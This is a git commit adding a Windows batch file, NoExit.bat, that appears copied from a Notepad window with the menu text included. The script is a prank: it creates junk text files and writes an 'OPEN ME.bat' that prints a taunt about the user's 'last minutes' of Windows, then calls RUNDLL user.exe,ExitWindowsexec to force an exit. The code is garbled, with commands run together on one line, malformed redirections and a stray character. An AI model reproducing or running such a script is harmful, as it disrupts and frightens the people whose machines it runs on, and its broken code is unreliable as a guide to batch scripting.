bc5d7ddf5b47eaa4e0fe6417e3abe67a11ac10f2
Matthew <mcissell5115@gmail.com>
2025-07-07 13:36:19 -0500

    Add files via upload

---
+++ NoExit.bat
@@ -0,0 +1,9 @@
+
+NoExit Notepad
+File Edit Search Help
+@echo off
+echo Noexit.bat >> "N.txt" echo Noexit.bat >> "No.txt" echo Noexit.bat >> "No e.txt" echo Noexit.bat >> "No es.txt" echo Noexit.bat >> "No esc.txt" echo Noexit.bat >> "No esca.txt" echo Noexit.bat >> "No escap.txt" echo Noexit.bat >> "Nf.txt" echo Noexit.bat >> "Nom.txt" echo Noexit.bat >> "No el.txt" echo Noexit.bat >> "No esn.txt" echo Noexit.bat >> "No escl.txt" echo Noexit.bat >> "No escak.txt" echo Noexit.bat >> "No escapo.txt" echo @echo off >> "OPEN ME.bat"
+echo You have last minutes of the Windows OS get ready HAHAHAHAHAHAHAAAAA >> echo >> "OPEN ME.bat"
+echo >> "OPEN ME.bat"
+echo ExitWindowsexec >> "OPEN ME.bat" RUNDLL.exe user.exe,ExitWindowsexec
+I
